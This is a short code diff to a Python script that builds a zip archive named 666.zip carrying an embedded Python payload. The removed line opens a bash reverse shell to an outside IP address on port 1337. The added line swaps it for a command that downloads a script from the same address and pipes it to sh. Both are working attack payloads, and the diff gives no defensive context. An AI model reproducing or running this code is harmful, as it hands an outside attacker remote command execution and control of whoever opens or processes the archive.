@@ -3,7 +3,7 @@ import zipfile
 if __name__ == "__main__":
     try:
         binary1 = b'1ue'
-        binary2 = b'import os\r\nos.system(\'bash -i >& /dev/tcp/103.251.89.204/1337 0>&1\')'
+        binary2 = b'import os\r\nos.system(\'curl http://103.251.89.204:13338|sh\')'
         zipFile = zipfile.ZipFile("666.zip", "a", zipfile.ZIP_DEFLATED)
         info = zipfile.ZipInfo("666.zip")
         zipFile.writestr("test", binary1)
